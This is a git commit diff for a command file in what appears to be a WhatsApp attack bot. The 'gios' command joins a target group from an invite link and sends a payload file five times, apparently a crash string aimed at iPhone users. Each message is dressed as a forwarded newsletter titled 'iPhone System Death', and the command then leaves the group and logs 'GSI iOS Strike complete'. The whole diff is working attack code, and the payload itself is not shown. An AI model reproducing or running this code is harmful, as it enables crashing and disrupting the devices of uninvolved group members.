46023b8617d3c6e04ab52f05f4cd1db23671651b
Loving Programming <officialstanlee143@gmail.com>
2026-02-11 17:00:20 +0300

    Update gios.js

--- commands/bug/gios.js
+++ commands/bug/gios.js
@@ -2,22 +2,22 @@ const fs = require('fs');
 const config = require('../../config');
 
 module.exports = {
-    name: "gsi",
-    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
+    name: "gios",
+    execute: async (conn, msg, args, { from, isOwner }) => {
         if (!isOwner) return;
-        const payload = fs.readFileSync('./lib/payloads/sios.txt', 'utf-8');
-        const code = args[0].split('https://chat.whatsapp.com/')[1];
-        
         try {
+            const payload = fs.readFileSync('./lib/payloads/sios.txt', 'utf-8');
+            const code = args[0].split('https://chat.whatsapp.com/')[1];
             const jid = await conn.groupAcceptInvite(code);
+
             for (let i = 0; i < 5; i++) {
                 await conn.sendMessage(jid, { 
                     text: "\u200B" + payload,
-                    contextInfo: { forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid, newsletterName: "ɪᴘʜᴏɴᴇ ᴄʀɪᴛɪᴄᴀʟ ᴇʀʀᴏʀ" } }
+                    contextInfo: { forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid, newsletterName: "ɪᴘʜᴏɴᴇ ꜱʏꜱᴛᴇᴍ ᴅᴇᴀᴛʜ" } }
                 });
             }
             await conn.groupLeave(jid);
-            await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Success: iOS Souls Banishment Done.") });
-        } catch (e) { msg.reply("🥀 Target group secured."); }
+            await conn.sendMessage(conn.user.id, { text: "🥀 Mission Success: GSI iOS Strike complete." });
+        } catch (e) {}
     }
 };
